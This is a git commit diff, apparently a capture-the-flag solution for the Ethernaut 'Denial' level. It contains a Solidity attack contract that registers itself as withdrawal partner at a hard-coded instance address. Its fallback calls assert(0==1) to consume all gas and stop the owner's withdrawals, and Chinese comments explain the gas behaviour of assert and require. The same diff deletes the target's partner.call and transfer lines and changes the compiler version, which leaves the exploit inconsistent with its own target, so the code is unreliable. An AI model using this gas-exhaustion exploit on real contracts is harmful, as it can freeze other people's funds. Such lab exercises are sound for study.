039629dd7b8c1a3d54cecb7e63ffd5ae9364377c
zhou <1036767219@qq.com>
2023-02-14 14:12:35 +0800

    upadte Denial合约攻击合约

--- 21_Denial.sol
+++ 21_Denial.sol
@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.4.24;
 contract Denial {
 
     address public partner; // withdrawal partner - pay the gas, split the withdraw
@@ -16,15 +16,12 @@ contract Denial {
         uint amountToSend = address(this).balance / 100;
         // perform a call without checking return
         // The recipient can revert, the owner will still get their share
-        partner.call{value:amountToSend}("");
-        payable(owner).transfer(amountToSend);
         // keep track of last withdrawal time
         timeLastWithdrawn = block.timestamp;
         withdrawPartnerBalances[partner] +=  amountToSend;
     }
 
     // allow deposit of funds
-    receive() external payable {}
 
     // convenience function
     function contractBalance() public view returns (uint) {
@@ -32,13 +29,21 @@ contract Denial {
     }
 }
 
-
 contract hack {
-    Denial a = Denial(0x32eF8629d2FA8D6953e938b444FE463A0367C22e);
+    address instance_address = 0x32eF8629d2FA8D6953e938b444FE463A0367C22e;
+
+    Denial a = Denial(instance_address);
     
     function hack1() public {
         a.setWithdrawPartner(address(this));
         a.withdraw();
     }
+
+    function() payable {
+        assert(0==1);
+    }
     
 }
+
+//assert(false),编译为0xfe,这是一个无效的操作码，故将消耗掉所有剩余的gas，并恢复所有的操作
+//require(false)编译为0xfd,这是revert()的操作码，它将退还所有剩余的gas，同时可以返回一个值（自定义的报错信息
